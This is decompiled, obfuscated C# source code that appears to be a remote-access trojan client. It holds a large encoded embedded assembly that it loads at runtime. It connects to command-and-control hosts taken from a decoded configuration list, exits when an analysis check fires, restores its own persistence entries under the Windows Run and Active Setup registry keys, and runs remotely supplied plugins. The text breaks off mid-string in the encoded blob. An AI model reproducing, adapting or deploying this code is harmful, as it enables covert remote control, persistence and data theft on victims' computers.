using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Plugin;

namespace ns0;

internal class Class2
{
	private const string string_0 = "sr/1ZWhlZWVpZWVlZGRlZR1lZWVlZWVlpWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVl5WVlZXOEH3NlGW4yhh1msTKGuc3O2IXV19TM18bShcjG09PU2YXHyoXX2tOFztOFqbS4hdLUycqTcnJviWVlZWVlZWW1qmVlsWZoZaAz8bNlZWVlZWVlZUVlZ4ZwZm1lZYFlZWVrZWVlZWVl859lZWWFZWVlpWVlZWWlZWWFZWVlZ2VlaWVlZWVlZWVpZWVlZWVlZWXlZWVlZ2VlZWVlZWhlpeplZXVlZXVlZWVldWVldWVlZWVlZXVlZWVlZWVlZWVlZaWfZWWwZWVlZaVlZeVoZWVlZWVlZWVlZWVlZWVlZWVlZcVlZXFlZWUNnmVlgWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlhWVlbWVlZWVlZWVlZWVlbYVlZa1lZWVlZWVlZWVlZZPZyt3ZZWVl+X9lZWWFZWVlgWVlZWdlZWVlZWVlZWVlZWVlZYVlZcWT19jXyGVlZeVoZWVlpWVlZWllZWWDZWVlZWVlZWVlZWVlZWWlZWWlk9fK0dTIZWVxZWVlZcVlZWVnZWVlh2VlZWVlZWVlZWVlZWVlpWVlp2VlZWVlZWVlZWVlZWVlZWXVn2VlZWVlZa1lZWVnZWplDYplZWV5ZWVmZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZbtnjXZlZW9lZWfYd2Vlb+JuZWVpZY9lZXiVaGW+ZWVlZmVldmXYeGVlb+VwZWVp2HllZW/lb2VlaeNvZWVp43BlZWln1HplZW9l43BlZWnUe2Vlb2XjcGVladR8ZWVvb+NwZWVp1H1lZW9leeVwZWVpeeVvZWVpa3CQZWyPZWVleJVnZbhlZWVnZWV2ZWfYfmVlb+VwZWVp2HllZW/lb2VlaeNvZWVp43BlZWnUf2Vlb9psZWVnb+NwZWVp1HtlZW9l43BlZWnUfWVlb2V55XBlZWl55W9lZWlrcJBlbI+DZ412ZWVvj2V4lWZlcGVlZWhlZXZn4HdlZWlvkGVrj4dnaOJ3ZWVpj3iVZmVwZWVlaWVldmfgeGVlaW+QZWuPh2do4nhlZWmPeJVoZa9lZWVqZWV2ZWeNgWVlb42CZWVvNXtlZWaNg2Vlb3zUhGVlb29r8857Y2d7Y2ZxbZJ7ZWt7/9l7ZWVm1IVlZW/YhmVlb3CQbeOHZWVvcJBlbI9vZY9lZWV4lWhllWVlZWtlZXZn4HFlZWlva3BsaI2IZWVv2XFlZWZxZ+FxZWVpbWyNZmVlkG9rbGNme2Nmcm6SPY94lWhllWVlZWtlZXZn4HFlZWlva3BsaI2KZWVv2XFlZWZxZ+FxZWVpbWyNZmVlkG9rbGNme2Nmcm6SPY94lWhllWVlZWtlZXZn4HJlZWlva3BsaI2IZWVv2XFlZWZxZ+FyZWVpbWyNZmVlkG9rbGNme2Nmcm6SPY94lWhllWVlZWtlZXZn4HJlZWlva3BsaI2KZWVv2XFlZWZxZ+FyZWVpbWyNZmVlkG9rbGNme2Nmcm6SPY94lWhllWVlZWtlZXZn4HNlZWlva3BsaI2IZWVv2XFlZWZxZ+FzZWVpbWyNZmVlkG9rbGNme2Nmcm6SPY94lWhllWVlZWtlZXZn4HNlZWlva3BsaI2KZWVv2XFlZWZxZ+FzZWVpbWyNZmVlkG9rbGNme2Nmcm6SPY94lWhllWVlZWxlZXZn4HRlZWlva3BsaI2IZWVv2WhlZWdxZ+F0ZWVpbWyNZ2VlkG9rbGNme2Nmcm6SPY94lWhllWVlZWxlZXZn4HRlZWlva3BsaI2KZWVv2WhlZWdxZ+F0ZWVpbWyNZ2VlkG9rbGNme2Nmcm6SPY94lWhllWVlZW1lZXZn4HVlZWlva3BsaI2IZWVv2WdlZWdxZ+F1ZWVpbWyNaGVlkG9rbGNme2Nmcm6SPY94lWhllWVlZW1lZXZn4HVlZWlva3BsaI2KZWVv2WdlZWdxZ+F1ZWVpbWyNaGVlkG9rbGNme2Nmcm6SPY94lWhllWVlZW5lZXZn4HZlZWlva3BsaI2IZWVv2WllZWdxZ+F2ZWVpbWyNaWVlkG9rbGNme2Nmcm6SPY94lWhllWVlZW5lZXZn4HZlZWlva3BsaI2KZWVv2WllZWdxZ+F2ZWVpbWyNaWVlkG9rbGNme2Nmcm6SPY94lWhlqWVlZW9lZXZlaG9re5NnkIJn4HRlZWl5Y2ZwbJJzZ+B0ZWVpZ2nUa2Vla2WQgmfgdWVlaXljZnBsknNn4HVlZWlnadRnZWVrZZBlj3iVaGWCZWVlcGVldmVn4HZlZWl5Y2Zva5JzZ+B2ZWVpZ2jUb2Vla2WPZWVleJVoZYJlZWVwZWV2ZWfgcWVlaXljZm9rknNn4HFlZWlnedSLZWVvZY9lZWVolWhlrWVlZWVlZWVlZ+BxZWVpeXnUi2Vlb2Vn4HJlZWl5edSLZWVvZWfgc2VlaXl51ItlZW9lZ+B1ZWVpeXnUZ2Vla2Vn4HZlZWl5edRvZWVrZY+DZ412ZWVvj6e4r6dmZWZlZWVlZXFlZWXbl5OVk5qVnJecZWVlZWpl0WVlZWluZWWI42Vl1W5lZUVsZWWIuNnXztPM2GVlZWW1dmVlbWVlZYi6uGW9dmVldWVlZYisuq6pZWVlzXZlZf1nZWWIp9HUx2VlZWVlZWVnZWVmvIIbbm5tZWVlX4qYZXtlZWZlZWWKZWVlbmVlZXhlZWWXZWVllmVlZYtlZWVpZWVleGVlZXBlZWVmZWVla2VlZWZlZWVxZWVlf2VlZWZlZWVmZWVlZ2VlZWllZWVlZW9lZmVlZWVla2X7ZfRla2UNZfRla2USZfRla2UmZfRla2UzZfRla2WBZvRla2WsZpFma2XnZrhma2UEZvpma2XBZ/Rlb2XqZ9Vna2U+Z/Rla2VcaUppa2Vzakppa2WQakppa2Wvakppa2XIakppa2Xhakppa2X8akppa2UXakppa2VPajBqa2VjajBqa2Vxa0ppa2WKa0ppa2W6a6drzGXOa2Vla2X9a91ra2Uda91ra2U7a/Rla2VRa/pma2VubN1ra2WJbPRla2WWbEppa2WrbPRla2XzbPRla2UVbARsa2U4bPRlZWVlZWZlZWVlZWZlZmVmZmVle2WOZWplZmVmZWZmZWWVZY5lamVmZWplZmZlZadljmVqZWZlbmVmZmVlvGWOZW5lZmVyZWZmZWXIZY5lbmVpZXJlZoV1Zc1ljmVyZWxlcmVmZXVl2GWOZXJlb2VzZeZldWXjZY5lcmVxZXZla2tXZY9lu+VfZZJlu+VkZZJla2tXZY9lu+VsZqBlu+VzZqBla2V6ZqRla2WGZqdla2WzZqtldmX3ZrZldmURZrplZmVLZwNlZmWMaANlZmWvaANlZmXSaA1lZmXvaBdlZmUPaCFlZmVQaDNlZmVzaTdlZWVlZWhl630ZZW9lZmVlZWVlaGUrZh9ldWVoZWVlZWVoZStmQWV9ZWplZWVlZWhlK2ZNZYllbmVlZWVlaGXrfRllb2VvZWVlZWVoZStmH2V1ZXFlZWVlZWhlK2ZBZX1lc2VlZWVlaGUrZk1liWV3ZWVlZWVoZet9GWVvZXhlZWVlZWhlK2YfZXVlemVlZWVlaGUrZkFlfWV8ZWVlZWVoZStmTWWJZYBltYVlZWVl630ZZbJlgWXNhWVlZWX7ZRRmvmWBZTWFZWVlZftlHmbFZYJllIZlZWVl630ZZbJlg2VlZWVlZWUrcipmzGWDZWVlZWVlZStyM2bMZYNlZWVlZWVlK3JDZsxlg2VlZWVlZWUrck5m0GWDZWVlZWVlZStyX2bVZYNlZWVlZWVlK3J3Z9Vlg2VlZWVlZWUrcoln1WWDZZ2GZWVlZettlWfZZYNltIZlZWVl622rZ95lg2VlZWVlZWUrcsln5GWEZWVlZWVlZSty72fpZYRlvYZlZWVl6239Z+5lhGXUhmVlZWXrbQ1n8mWEZd2GZWVlZettHWf3ZYVlZWVlZWVlK2omZ7JlhWVlZWVlZWUrajFn/GWFZTOGZWVlZStmOWfyZYdlOYZlZWVl621dZwdliGV1h2VlZWXrbXNoB2WJZbGHZWVlZettlGgHZYpl7YdlZWVl622gaAdli2Uph2VlZWXrbbdoB2WMZWWIZWVlZettw2gHZY1loYhlZWVl623YaBFljmXdiGVlZWXrbeJoEWWPZRmIZWVlZett9mgbZZBlVYhlZWVl620BaBtlkWWRiWVlZWXrbRhoJWWSZc2JZWVlZettJWglZZNlCYllZWVl62U1aCtllGVZiWVlZWXrZTpo3mWWZYWKZWVlZetlRWiyZZdlsYplZWVl5mVOaLJll2UFimVlZWXpfRllsmWXZWVlZmUHaWVlZ2UOaWVlZmUVaWVlZ2VOaGVlZmUVaWVlZ2VOaGVlaGUcaWVlaWUHaWVlZmUlaWVlZmUHaWVlZ2UOaWVlZmUVaWVlZ2VOaGVlZmUVaWVlZ2VOaGVlaGUcaWVlaWUHaWVlZmUlaWVlZmUHaWVlZ2UOaWVlZmUVaWVlZ2VOaGVlZmUVaWVlZ2VOaGVlaGUcaWVlaWUHaWVlZmUlaWVlZmUsaWVlZmUxaWVlZmUzaWVlZmUzaWVlZmU5aWVlZ2VOaGVlZmU5aWVlZmUzaWVlZmUzaWVlZmUzaWVlZmUzaWVlZmUzaWVlZmUzaWVlZmUzaWVlZmUzaWVlZmUzaWVlZmUzaWVlZmUzaWVlZmUzaWVlZmVFaWVlZ2VOaGVlZmVOaM5lGWVfZdZlGWVfZd5lGWVfZeZlGWVfZe5lGWVfZfZlGWVfZf5lGWVfZQZlGWVfZQ5lGWVkZRZlGWVfZR5lGWVfZSZlGWVfZS5lGWVpZj5lGWVvZkZlGWWyZU5lGWWyZX5lGWWyZXFlGWWyZa5lGWWyZaZlGWWyZaZlFGZ6ZlZlWGuyZa5lXmuBZlZlZmyyZa5lGWWNZqZlHmaTZl5lGWWyZX5ljmypZm5mn2yvZmZmvWy4Zm5mz2zBZhZl42zMZZZlGWVfZZZl7WynZX5m/GzSZoZmIWzeZn5mMWzSZsZlH2UxZm1lbWWWZW1lcWWbZW1leWWWZW1lfWWbZZNliGVmZ5Nl4GXbZ5NlmGVzZ5Nl2GXSZ5NlcGU5ZpNleGVFZpNlgGVgZpNlkGU5ZpNloGVgZpNlsGVgZpNluGWSZ5NlyGW8Z5Nl0GXJZ6ZnQGWbZcZnQGWbZWVoQGWbZYVoQGWbZeVoQGWbZQVoQGWbZYZmmWagZqVmymbwZv9mDmYdZidmLWZuZWZlZWVLZ5ZlZWWMaJZlZWWvaJZlZWXSaHFlZWXvaG1lZWUPaHVlbmVmZWVlkGk6ZWVllWk6ZWVloWk6ZWVlqGk+ZWVltWlDZWVlyWlDZWVl12lDZWVl32lHZWVlwWdMZWVl8WlRZWVl+2lWZWVlgWZaZXVliGVnZW1lh2VnZWdldmVoZXVlimVpZW1liWVpZWdld2VqZW1li2VrZXVljGVrZWdleGVsZXVljmVtZW1ljWVtZWdleWVuZXVlkGVvZW1lj2VvZWdlemVwZXVlkmVxZW1lkWVxZWdle2VyZWdlfGV0ZWdlfWV2ZWZlfmV2ZWdlf2V4ZWdlgGV6ZWZlgmV8ZWdlgWV8ZWdlg2V+ZXRmaeVlZWZlZWVlZWVlZWVlZWVl42VlZWdlZWVlZWVlZWVlZWZl62VlZWVlZ2VlZWVlZWVlZWVlZmXVZ2VlZWWuZetmrmX6Zq5lCWauZRhmZWVlobLUydrRyqNlrrXR2szO05PJ0dFltNrZ1drZqtvK09mtxtPJ0crXZbXR2szO02Wu09Xa2arbytPZrcbTydHK12W3ysjKztvKyarbytPZrcbTydHK12W10drMztO42cbZymW4zsnKZbXR2szO06bXzNhluMrXzsbRzt/K12WutdHazM7TZdLYyNTX0c7HZbje2NnK0mWy2tHZzsjG2NmpytHKzMbZymWq09rSZbTHz8rI2WWTyNnU12Wu09vU0MplrqbY3tPIt8rY2tHZZabY3tPIqMbR0cfGyNBlp8rMztOu09vU0MplZdfjP6rTya7T29TQymXbxtHaysTEZbO0s6plt7qzs66zrGWosa6qs7lluKq3u6q3Za3KxsnK12Ws2s7JZbXR2szO06zazslluN7Y2crSk6jU0dHKyNnO1NPYk6zK08rXzshlsc7Y2cWWZanG2cZluN7Y2crSk7fa09nO0sqTuMrXzsbRzt/G2c7U05Or1NfSxtnZytfYk6fO08bX3mWnztPG196r1NfSxtnZytdlx8tluN7Y2crSk660ZbLK0tTX3rjZ18rG0mXS2GW4ytfOxtHO38plqcrYytfOxtHO38plzMrZxLPG0splzMrZxKnK2MjXztXZztTTZczK2cSm2tnN1NdlzMrZxKja19fK09m42cbZymXMytnEuNnU1bTTqc7YyNTT08rI2c7U02XMytnEqt3KyNrZyrTTsdTGyWXMytnErcbYq9TX0mXMytnEqt3KyNrZyrTTsdTGyabXzNhl2MrZxKrdysja2cq007HUxsmm18zYZbvK19jO1NNlzMrZxLvK19jO1NNluN7Y2crSk7zO08nU3NiTq9TX0thlq9TX0mXMytnErtPV2tmr1NfSZczK2cS42cbZyrTHz8rI2WXYytnEuNnG2cq0x8/KyNllzMrZxKzazsllrtPO2c7G0c7fymWq3crI2tnKZbjZ1NVlqtvK09mtxtPJ0crXZardysja2c7U06jU0tXRytnKZcbJycSq3crI2tnO1NOo1NLV0crZymXXytLU28rEqt3KyNrZztTTqNTS1dHK2cpluNnG19nKyWXGycnEuNnG19nKyWXXytLU28rEuNnG19nKyWW42dTV1crJZcbJycS42dTV1crJZdfK0tTbysS42dTV1crJZa7T1drZZcbJycSu09Xa2WXXytLU28rErtPV2tlltNrZ1drZZcbJycS02tnV2tll18rS1NvKxLTa2dXa2WW3ysjKztvKyWXGycnEt8rIys7bysll18rS1NvKxLfKyMrO28rJZbjK08lltNO3ysjKztvKyWWq3crI2tnKyWXKZaGq3crI2tnKtNOx1MbJptfM2KPQxMSnxsjQztPMq87K0cllobjZxtnKtMfPysjZo9DExKfGyNDO08yrzsrRyWWzxtLKZanK2MjXztXZztTTZaba2c3U12Wo2tfXytPZuNnG2cpluNnU1bTTqc7YyNTT08rI2c7U02Wq3crI2tnKtNOx1MbJZa3G2KvU19Jlqt3KyNrZyrTTsdTGyabXzNhlrtPV2tmr1NfSZbjZxtnKtMfPysjZZdTHz8rI2WXSytnN1Mll2MrTycrXZcjG0dHHxsjQZdfK2NrR2WXG18zYZcdl28bR2spl2NnG2cq0x8/KyNll2M7JymW43tjZytKTt8rL0crI2c7U02Wm2NjK0sfR3rnO2dHKptnZ187H2tnKZabY2MrSx9HeqcrYyNfO1dnO1NOm2dnXzsfa2cplptjYytLH0d6o1NPLzsza18bZztTTptnZ187H2tnKZabY2MrSx9HeqNTS1cbT3qbZ2dfOx9rZymWm2NjK0sfR3rXX1MnayNmm2dnXzsfa2cplptjYytLH0d6o1NXe187Mzdmm2dnXzsfa2cplptjYytLH0d6518bJytLG19Cm2dnXzsfa2cplptjYytLH0d6o2tHZ2tfKptnZ187H2tnKZbje2NnK0pO32tPZztLKk67T2crX1NW4ytfbzsjK2GWo1NK7ztjOx9HKptnZ187H2tnKZazazsmm2dnXzsfa2cplptjYytLH0d67ytfYztTTptnZ187H2tnKZabY2MrSx9Heq87RyrvK19jO1NOm2dnXzsfa2cpluN7Y2crSk6nOxszT1NjZzsjYZanKx9rMzMbH0cqm2dnXzsfa2cplqcrH2szMztPMstTJythluN7Y2crSk7fa09nO0sqTqNTS1c7Ryte4ytfbzsjK2GWo1NLVztHG2c7U07fK0cbdxtnO1NPYptnZ187H2tnKZbfa09nO0sqo1NLVxtnOx87RztneptnZ187H2tnKZbjK187G0c7fxsfRyqbZ2dfOx9rZymW42dfKxtJlqNHU2MpludSm19fG3mWpztjV1NjKZajU0tXO0crXrMrTytfG2crJptnZ187H2tnKZbne1cplrMrZud7VymWm2NjK0sfR3mWsytmm2NjK0sfR3mW32tPZztLKud7Vyq3G08nRymWsytm53tXKq9fU0q3G08nRymWsytmo2tjZ1NKm2dnXzsfa2crYZczK2cS7xtHaymWq0tXZ3mWpytHKzMbZymWo1NLHztPKZbje2NnK0pO5zdfKxsnO08xlrtPZytfR1MjQysllqNTS1cbXyqrdyM3G08zKZbfK0tTbymWq28rT2abXzNhlZWVlZWiFZWVlZWU5ghRJszUPpv2EEInNkpunZW0c38G7fplF7mqFZ2aBfWyFZ2Z3iXeBcIVpd3Z3iXeBd3qBaoVmZnd2Z2ttaGt2eWllZWVlaWZlZWVoa3Z9Z2tzaGt2fmtreneCZoFohWVmaGt3hmhrd4prZWaCaneBa2Vmd4GCamiFZXNphWV2eWiFZWdphWV3gWqFZmZ3gWmFZXeOaYVld5JohWWBaYVmZoFphWV2fmuFZ2aBd4Foa3eWaoVmZneWaGt3cWqFZmZ3cWhrd21qhWZmd21oa3d1aoVmZnd1bIVnZnZ9d4Foa3eBZ2uBaI1lc2mNZXZ5aI1lZ2mNZXeBaY1ld45pjWV3kmiNZYFpjWV2fmmFZmZzaYVmZmdqhWZmds5phWZmbWp6d4JmgWuFZ2Z33oFphWWCamtsZ4JqgmpqhWZmgmpqhWaBd95rbGd3gXeBaWxmd4FobGaBaoVld+XmbWVmd+Xqd+XmbWVmd+XmduXubYVngoF35eZnbGxogoF2fmdwZWd35fJ35fJ35fJxdWZog2V1g2WDZYNlaW9md5ZubGl3lneWd5ZnaW9md3FubGl3cXdxd3FnaW9md21ubGl3bXdtd21naW9md3VubGl3dXd1d3Vnamxndn1naGxmZ2yFZ2aBd+X6cGZla7XR2szO02Vlf2ZlerPK2ZK8ysbbyoW10drMztOFp8bYymVlamZlZWVlcWZlbN24ztHK09llZYNmZX6o1NXe187MzdmFJw6F3bjO0crT2YWXlZaWZWWOZmWJnJibxpnKlZqSyMeeypKZx5rLkp7JyZqSl8bIm57Ky8iVyZ6eZWVxZmVslpOVk5WTlWVlbWZlbGZlZWVlbWZlbWVlZWVlg2ZlZmW5Z3u818bVs9TTqt3IytXZztTTuc3X1NzYZmVlZWVlZWWgM/GzZWVlZWdlZWXfZWVlKZ5lZSmAZWW3uKm41dztI1/RZbLoGXJwyY/YFmdlZWWon8G62MrX2MGzxtnNxtPBqdTI2tLK09nYwbvO2NrG0YW42drJztSFl5WWlcG119TPysjZ2MG119TPysjZhamp1LjK18G10drMztPB1MfPwanKx9rMwa610drMztOT1cnHZWVlzZ9lZWVlZWVlZWVl459lZWWFZWVlZWVlZWVlZWVlZWVlZWVlZWVlZdWfZWVlZWVlZWXEqNTXqdHRssbO02XS2MjU18rKk8nR0WVlZWVlZIplhaVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZmV1ZWVlfWVl5WVlZWVlZWVlZWVlZWVlZmVmZWVllWVl5WVlZWVlZWVlZWVlZWVlZmVlZWVlrWVlZb2lZWWJaGVlZWVlZWVlZWWJaJllZWW7ZbhlxGW7Zaplt2W4Za5ltGWzZcRlrmWzZatltGVlZWVlImlUY2VlZmVlZWZlZWVlZWVlZmVlZWVlpGVlZWVlZWVpZWVlZ2VlZWVlZWVlZWVlZWVlZallZWVmZbtlxmXXZatlzmXRZcplrmXTZctl1GVlZWVliWVpZWVluWXXZcZl02XYZdFlxmXZZc5l1GXTZWVlZWVlZRVp6WdlZWZluGXZZddlzmXTZcxlq2XOZdFlymWuZdNly2XUZWVlxWdlZWZllWWVZZVllWWVZZllx2WVZWVlqWV7ZWZlqGXUZdJl0mXKZdNl2WXYZWVls2XKZdllkmW8ZcplxmXbZcplhWW1ZdFl2mXMZc5l02WFZadlxmXYZcplZWWVZW1lZmWoZdRl0mXVZcZl02XeZbNlxmXSZcplZWVlZd1luGXOZdFlymXTZdllZWWdZWxlZmWrZc5l0WXKZallymXYZchl12XOZdVl2WXOZdRl02VlZWVltWXRZdplzGXOZdNlZWVlZZVlbWVmZatlzmXRZcplu2XKZddl2GXOZdRl02VlZWVllmWTZZVlk2WVZZNllWVlZZ1lcWVmZa5l02XZZcpl12XTZcZl0WWzZcZl0mXKZWVlrmW1ZdFl2mXMZc5l02WTZcll0WXRZWVlvWV+ZWZlsWXKZcxlxmXRZahl1GXVZd5l12XOZcxlzWXZZWVlqGXUZdVl3mXXZc5lzGXNZdllhWUOZYVl3WW4Zc5l0WXKZdNl2WWFZZdllWWWZZZlZWVlZaVlcWVmZbRl12XOZcxlzmXTZcZl0WWrZc5l0WXKZdNlxmXSZcplZWWuZbVl0WXaZcxlzmXTZZNlyWXRZdFlZWWVZWxlZmW1Zddl1GXJZdplyGXZZbNlxmXSZcplZWVlZbVl0WXaZcxlzmXTZWVlZWWZZW1lZmW1Zddl1GXJZdplyGXZZbtlymXXZdhlzmXUZdNlZWWWZZNllWWTZZVlk2WVZWVlnWVtZWZlpmXYZdhlymXSZcdl0WXeZYVlu2XKZddl2GXOZdRl02VlZZZlk2WVZZNllWWTZZVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVllWVlcWVlZfWfZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZQ==";

	private static List<GClass2> list_0;

	private static List<Class14> list_1;

	private static bool bool_0;

	private static bool bool_1;

	private static int int_0;

	[MTAThread]
	private static int Main()
	{
		if (Class3.bool_13 && (!Class3.bool_0 || !(Process.GetCurrentProcess().MainModule!.FileName == Path.Combine(Class3.string_1, Class0.smethod_3(Class3.string_2, bool_0: true)))))
		{
			Class7.smethod_0();
		}
		smethod_0();
		smethod_1();
		try
		{
			while (true)
			{
				string text = Console.ReadLine();
				if (text.ToLower() == "clear")
				{
					Console.Clear();
				}
			}
		}
		catch
		{
		}
		Process.GetCurrentProcess().WaitForExit();
		return 0;
	}

	private static void smethod_0()
	{
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0168: Expected O, but got Unknown
		bool_0 = false;
		bool_1 = false;
		AppDomain.CurrentDomain.AssemblyResolve += smethod_6;
		Class8.smethod_0(Class3.string_6);
		if (Class8.Boolean_0)
		{
			Process.GetCurrentProcess().Kill();
			return;
		}
		string[] array = Class0.smethod_3(Class3.string_0, bool_0: true).Split(new char[1] { '|' });
		list_1 = new List<Class14>();
		for (int i = 0; i < array.Length; i++)
		{
			if (!string.IsNullOrEmpty(array[i]))
			{
				Class14 @class = new Class14(array[i].Split(new char[1] { '>' })[0], int.Parse(array[i].Split(new char[1] { '>' })[1]), Class0.smethod_2(array[i].Split(new char[1] { '>' })[2].Trim(), bool_0: true));
				@class.Disconnected += smethod_10;
				@class.ConnectionAccepted += smethod_9;
				@class.Received += smethod_8;
				@class.Sent += smethod_11;
				list_1.Add(@class);
			}
		}
		GClass1.smethod_0();
		GClass0.PluginAdded += smethod_5;
		SystemEvents.add_SessionEnding(new SessionEndingEventHandler(smethod_4));
		if (Class3.bool_0 && Process.GetCurrentProcess().MainModule!.FileName != Path.Combine(Class3.string_1, Class0.smethod_3(Class3.string_2, bool_0: true)))
		{
			new Thread(Class1.smethod_0).Start();
		}
		if (Class3.bool_10 && Process.GetCurrentProcess().MainModule!.FileName != Path.Combine(Class3.string_1, Class0.smethod_3(Class3.string_2, bool_0: true)))
		{
			GClass1.smethod_3();
		}
		if (Class3.bool_0 && Process.GetCurrentProcess().MainModule!.FileName == Path.Combine(Class3.string_1, Class0.smethod_3(Class3.string_2, bool_0: true)))
		{
			GClass0.smethod_1();
		}
		else
		{
			GClass0.smethod_2();
		}
		if (Class3.bool_0)
		{
			list_0 = new List<GClass2>();
			GClass2 gClass = new GClass2(Class3.registryHive_0, Class3.string_9);
			gClass.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
			gClass.RegChanged += smethod_2;
			if (Class3.bool_12)
			{
				if (Class3.bool_1)
				{
					GClass2 gClass2 = new GClass2(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					gClass2.RegChanged += smethod_3;
					gClass2.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass2);
				}
				if (Class3.bool_2)
				{
					GClass2 gClass3 = new GClass2(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					gClass3.RegChanged += smethod_3;
					gClass3.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass3);
				}
				if (Class3.bool_3)
				{
					GClass2 gClass4 = new GClass2(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Active Setup\\Installed Components");
					gClass4.RegChanged += smethod_3;
					gClass4.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass4);
				}
			}
		}
		Class3.string_11 = smethod_21(smethod_20() + "|" + Environment.UserName);
	}

	private static void smethod_1()
	{
		foreach (Class14 item in list_1)
		{
			item?.method_0();
		}
		if (list_0 != null)
		{
			foreach (GClass2 item2 in list_0)
			{
				item2.method_2();
			}
		}
		Class10.smethod_2();
		if (Class3.bool_4)
		{
			smethod_18();
		}
	}

	private static void smethod_2(object sender, EventArgs e)
	{
		ThreadStart start = GClass0.smethod_0;
		new Thread(start).Start();
	}

	private static void smethod_3(object sender, EventArgs e)
	{
		ThreadStart start = Class1.smethod_2;
		new Thread(start).Start();
	}

	private static void smethod_4(object sender, SessionEndingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)e.get_Reason() == 2 && Class3.bool_0)
		{
			Class1.smethod_0();
		}
	}

	private static void smethod_5(object object_0, IPlugin iplugin_0)
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			iplugin_0.add_ExecutionComplete((EventHandler)smethod_15);
			iplugin_0.add_Output(new OutputEventHandler(smethod_14));
			iplugin_0.add_Started((EventHandler)smethod_13);
			iplugin_0.add_Stopped((EventHandler)smethod_12);
			GClass0.sortedList_1[iplugin_0.get_Guid()] = iplugin_0;
		}
		catch
		{
		}
	}

	private static Assembly smethod_6(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		return Assembly.Load(Encoding.GetEncoding(1252).GetBytes(Class0.smethod_3("sr/1ZWhlZWVpZWVlZGRlZR1lZWVlZWVlpWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVl5WVlZXOEH3NlGW4yhh1msTKGuc3O2IXV19TM18bShcjG09PU2YXHyoXX2tOFztOFqbS4hdLUycqTcnJviWVlZWVlZWW1qmVlsWZoZaAz8bNlZWVlZWVlZUVlZ4ZwZm1lZYFlZWVrZWVlZWVl859lZWWFZWVlpWVlZWWlZWWFZWVlZ2VlaWVlZWVlZWVpZWVlZWVlZWXlZWVlZ2VlZWVlZWhlpeplZXVlZXVlZWVldWVldWVlZWVlZXVlZWVlZWVlZWVlZaWfZWWwZWVlZaVlZeVoZWVlZWVlZWVlZWVlZWVlZWVlZcVlZXFlZWUNnmVlgWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlhWVlbWVlZWVlZWVlZWVlbYVlZa1lZWVlZWVlZWVlZZPZyt3ZZWVl+X9l